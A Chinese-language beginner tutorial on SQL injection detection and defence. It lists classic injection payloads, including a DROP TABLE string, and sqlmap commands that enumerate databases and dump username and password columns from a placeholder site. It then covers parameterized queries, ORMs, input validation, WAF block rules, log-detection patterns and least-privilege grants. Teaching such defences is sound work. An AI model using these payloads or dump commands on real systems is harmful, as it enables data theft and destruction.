---
order: 440
title: Cybersecurity SQL 注入检测与防御
module: 033-cybersecurity
category: '033-cybersecurity'
difficulty: beginner
description: Cybersecurity SQL 注入检测与防御 的完整教学讲解。
author: fanquanpp
updated: '2026-08-01'
related: []
prerequisites: []
---

# Cybersecurity SQL 注入检测与防御

> **符号约定**：`< >` 必填参数 | `[ ]` 可选参数

---

## SQL 注入识别

**基本写法：经典注入测试载荷**
```sql
`' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin'#
' OR 1=1 --`
```
```sql
# 经典 SQL 注入测试载荷
' OR '1'='1' --
```

**基本写法：数字型注入测试**
```sql
`1 OR 1=1
1; DROP TABLE users--
1 UNION SELECT NULL--
1 UNION SELECT username, password FROM users--`
```
```sql
# 数字型 SQL 注入测试
1 OR 1=1
1 UNION SELECT username, password FROM users--
```

**基本写法：UNION 注入**
```sql
`' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name FROM information_schema.tables--`
```
```sql
# UNION 注入获取数据
' UNION SELECT username, password FROM users--
```

---

## sqlmap 自动化检测

**基本写法：检测 URL 是否存在注入**
`sqlmap -u "<URL>"`
```bash
# 检测目标 URL 是否存在 SQL 注入
sqlmap -u "http://example.com/page?id=1"
```

**基本写法：指定注入参数**
`sqlmap -u "<URL>" -p <参数>`
```bash
# 指定检测 id 参数
sqlmap -u "http://example.com/page?id=1" -p id
```

**基本写法：POST 请求检测**
`sqlmap -u "<URL>" --data "<数据>"`
```bash
# 检测 POST 请求的注入
sqlmap -u "http://example.com/login" --data "username=admin&password=123"
```

**基本写法：使用 Cookie**
`sqlmap -u "<URL>" --cookie="<Cookie>"`
```bash
# 带认证 Cookie 检测
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
```

**基本写法：指定数据库类型**
`sqlmap -u "<URL>" --dbms=<数据库>`
```bash
# 指定数据库类型为 MySQL
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

---

## sqlmap 数据提取

**基本写法：枚举数据库**
`sqlmap -u "<URL>" --dbs`
```bash
# 列出所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs
```

**基本写法：枚举表**
`sqlmap -u "<URL>" -D <数据库> --tables`
```bash
# 列出指定数据库的表
sqlmap -u "http://example.com/page?id=1" -D mydb --tables
```

**基本写法：枚举列**
`sqlmap -u "<URL>" -D <数据库> -T <表> --columns`
```bash
# 列出表的列
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --columns
```

**基本写法：导出数据**
`sqlmap -u "<URL>" -D <数据库> -T <表> --dump`
```bash
# 导出表中的所有数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump
```

**基本写法：导出指定列**
`sqlmap -u "<URL>" -D <数据库> -T <表> -C <列1>,<列2> --dump`
```bash
# 导出指定列的数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users -C username,password --dump
```

---

## 参数化查询防御

**基本写法：Java 参数化查询**
```java
`String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();`
```
```java
// Java 使用 PreparedStatement 防止 SQL 注入
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

**基本写法：Python 参数化查询**
```python
`cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
```
```python
# Python 使用参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**基本写法：Node.js 参数化查询**
```javascript
`db.query('SELECT * FROM users WHERE id = ?', [userId], callback)`
```
```javascript
// Node.js 使用参数化查询
db.query('SELECT * FROM users WHERE id = ?', [userId], (err, results) => {
  // 处理结果
});
```

**基本写法：PHP PDO 参数化**
```php
`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);`
```
```php
// PHP PDO 参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);
```

---

## ORM 防御

**基本写法：Hibernate HQL**
```java
`String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);`
```
```java
// Hibernate 使用命名参数
String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);
```

**基本写法：Django ORM**
```python
`User.objects.filter(id=user_id)`
```
```python
# Django ORM 自动参数化
User.objects.filter(id=user_id)
```

**基本写法：SQLAlchemy**
```python
`session.query(User).filter(User.id == user_id)`
```
```python
# SQLAlchemy ORM 自动参数化
session.query(User).filter(User.id == user_id)
```

---

## 输入验证

**基本写法：白名单验证**
```python
`import re
if re.match(r'^[0-9]+$', user_id):
    # 安全处理`
```
```python
# 只允许数字的输入验证
import re
if re.match(r'^[0-9]+$', user_id):
    safe_id = int(user_id)
```

**基本写法：类型转换**
```python
`user_id = int(user_id)`
```
```python
# 强制类型转换防止注入
user_id = int(request.args.get('id'))
```

**基本写法：长度限制**
```python
`if len(username) <= 50:
    # 处理输入`
```
```python
# 限制输入长度
username = request.form.get('username', '')[:50]
```

---

## WAF 规则防御

**基本写法：ModSecurity 规则**
```apache
`SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"`
```
```apache
# ModSecurity 防止 SQL 注入
SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"
```

**基本写法：Nginx 防注入规则**
```nginx
`if ($args ~* "union.*select") {
    return 403;
}`
```
```nginx
# Nginx 简单防 SQL 注入
if ($args ~* "union.*select.*from") {
    return 403;
}
```

---

## 日志监控

**基本写法：检测 SQL 注入尝试**
```bash
`grep -iE "union.*select|'--|' or '1'='1" /var/log/nginx/access.log`
```
```bash
# 在日志中检测 SQL 注入特征
grep -iE "union.*select|'--|' or '1'='1|;.*drop" /var/log/nginx/access.log
```

**基本写法：统计可疑 IP**
```bash
`grep -iE "union.*select" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn`
```
```bash
# 统计 SQL 注入尝试的 IP
grep -iE "union.*select|' or '1'='1" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法：实时监控注入尝试**
```bash
`tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--"`
```
```bash
# 实时监控 SQL 注入尝试
tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--|' or '1'='1"
```

---

## 数据库最小权限

**基本写法：创建只读用户**
`GRANT SELECT ON <数据库>.<表> TO '<用户>'@'<主机>' IDENTIFIED BY '<密码>';`
```sql
# 创建只读数据库用户
CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：限制 DROP 权限**
`GRANT SELECT, INSERT, UPDATE ON <数据库>.* TO '<用户>'@'<主机>';`
```sql
# 只授予必要权限不含 DROP
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：撤销危险权限**
`REVOKE DROP, ALTER ON <数据库>.* FROM '<用户>'@'<主机>';`
```sql
# 撤销 DROP 和 ALTER 权限
REVOKE DROP, ALTER ON mydb.* FROM 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

---

## 错误信息处理

**基本写法：关闭数据库错误显示**
```php
`error_reporting(0);
ini_set('display_errors', 0);`
```
```php
// PHP 关闭错误显示防止信息泄露
error_reporting(0);
ini_set('display_errors', 0);
```

**基本写法：自定义错误页面**
```python
`try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器错误", 500`
```
```python
# Python 捕获异常返回通用错误
try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器内部错误", 500
```

**基本写法：Django 隐藏调试信息**
```python
`DEBUG = False
ALLOWED_HOSTS = ['example.com']`
```
```python
# Django 生产环境配置
DEBUG = False
ALLOWED_HOSTS = ['example.com']
```

## 参考文献



OWASP Top 10：https://owasp.org/www-project-top-ten/
OWASP Cheat Sheets：https://cheatsheetseries.owasp.org/
NIST 网络安全框架：https://www.nist.gov/cyberframework
CWE 数据库：https://cwe.mitre.org/
PortSwigger Web Security Academy：https://portswigger.net/web-security

## 延伸阅读



密码学与证书，见 033-cybersecurity 模块文档。
Web 攻击与防御，见 033-cybersecurity 模块相关文档。
网络层安全，见 032-networking 模块。
黑马程序员 Bilibili 空间（https://space.bilibili.com/37974444 ）提供网络安全课程。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| 安全基础与防御 | 001-SecurityBasicsDefense | 本文的前置基础 |
| Web安全与渗透测试 | 002-WebSecurityPenetrationTesting | 本文的安全延伸 |
| 二进制安全与应急响应 | 003-BinarySecurityAndIncidentResponse | 本文的安全延伸 |
| 安全工具与实战 | 004-SecurityToolsPractice | 本文的综合应用 |
| XSS攻击 | 005-XSSAttack | 本文的并列主题 |
| 安全模型与框架 | 006-SecurityModelFramework | 本文的安全延伸 |
| CSRF攻击 | 007-CSRFAttack | 本文的并列主题 |
| 密码学应用 | 008-CryptographyApplication | 本文的并列主题 |
| Web安全深度 | 009-WebSecurityDeep | 本文的安全延伸 |
| 安全运营中心 | 010-SOC | 本文的安全延伸 |
| SSRF攻击 | 011-SSRFAttack | 本文的并列主题 |
| 恶意代码分析 | 012-MalwareAnalysis | 本文的并列主题 |
| 云安全 | 013-CloudSecurity | 本文的安全延伸 |
| 对称加密 | 014-SymmetricEncryption | 本文的安全延伸 |
| 应急响应 | 015-IncidentResponse | 本文的并列主题 |
| 非对称加密 | 016-AsymmetricEncryption | 本文的安全延伸 |
| 哈希算法 | 017-HashAlgorithm | 本文的并列主题 |
| 安全开发 | 018-SecureDevelopment | 本文的安全延伸 |
| 合规与审计 | 019-ComplianceAudit | 本文的并列主题 |
| 数字证书 | 020-DigitalCertificate | 本文的并列主题 |
| HTTPS原理 | 021-HTTPSPrinciple | 本文的原理深化 |
| 渗透测试方法论 | 022-PenetrationTestingMethodology | 本文的并列主题 |
| 信息收集 | 023-InformationGathering | 本文的并列主题 |
| 漏洞扫描 | 024-VulnerabilityScan | 本文的并列主题 |
| 安全编码原则 | 025-SecureCodingPrinciples | 本文的安全延伸 |
| 输入验证 | 026-InputValidation | 本文的并列主题 |
| 认证与授权 | 027-AuthenticationAuthorization | 本文的并列主题 |
| OWASP-Top-10详解 | 028-OWASPTop10Detailed | 本文的并列主题 |
| XXE攻击 | 029-XXEAttack | 本文的并列主题 |
| 反序列化漏洞 | 030-DeserializationVulnerability | 本文的并列主题 |
| 零信任架构 | 031-ZeroTrustArchitecture | 本文的原理深化 |
| 身份与访问管理 | 032-IdentityAccessManagement | 本文的并列主题 |
| 安全基线 | 033-SecurityBaseline | 本文的安全延伸 |
| 漏洞扫描工具 | 034-VulnerabilityScanTools | 本文的并列主题 |
| WAF规则 | 035-WAFRule | 本文的并列主题 |
| Cybersecurity OpenSSL 证书管理 | 036-OpenSSLCert | 本文的并列主题 |
| Cybersecurity OpenSSL 加密解密 | 037-OpenSSLEncrypt | 本文的安全延伸 |
| Cybersecurity nmap 端口扫描 | 038-NmapScan | 本文的并列主题 |
| Cybersecurity 哈希工具 | 039-HashTools | 本文的并列主题 |
| Cybersecurity hashcat 密码破解 | 040-Hashcat | 本文的并列主题 |
| Cybersecurity GPG 加密与签名 | 041-GPGEncrypt | 本文的安全延伸 |
| Cybersecurity SSH 密钥管理 | 042-SSHKeys | 本文的并列主题 |
| Cybersecurity 密码哈希 | 043-PasswordHash | 本文的并列主题 |
| Cybersecurity SQL 注入检测与防御 | 044-SQLInjection | 本文自身 |
| Cybersecurity XSS 防御 | 045-XSSDefense | 本文的并列主题 |
| Cybersecurity CSRF 防御命令与配置 | 046-CSRFDefense | 本文的并列主题 |
| Cybersecurity XXE 防御与检测 | 047-XXEDefense | 本文的并列主题 |
| Cybersecurity 命令注入防御与检测 | 048-CommandInjection | 本文的并列主题 |
| Cybersecurity OAuth2/OIDC 配置命令 | 049-OAuth2OIDC | 本文的并列主题 |
| Cybersecurity 防火墙配置(ufw/firewalld) | 050-FirewallConfig | 本文的并列主题 |
| Cybersecurity IDS/IPS 命令(Suricata/Snort) | 051-IDSIPSCommands | 本文的并列主题 |
| Cybersecurity Metasploit 命令(渗透测试) | 052-MetasploitCommands | 本文的并列主题 |
| Cybersecurity Burp Suite 命令行 | 053-BurpSuiteCLI | 本文的并列主题 |
| Cybersecurity Nikto Web 扫描 | 054-NiktoScan | 本文的并列主题 |
| Cybersecurity OpenVAS 漏洞扫描 | 055-OpenVASCommands | 本文的并列主题 |
| Cybersecurity SELinux/AppArmor 强制访问控制 | 056-SELinuxAppArmor | 本文的并列主题 |
| Cybersecurity AIDE 文件完整性检查 | 057-AIDEFileIntegrity | 本文的并列主题 |
| Cybersecurity auditd 审计命令 | 058-AuditdCommands | 本文的并列主题 |
| Cybersecurity 隐写术工具命令 | 059-SteganographyTools | 本文的并列主题 |
| Cybersecurity 逆向工程命令(radare2/ghidra CLI) | 060-ReverseEngineering | 本文的并列主题 |
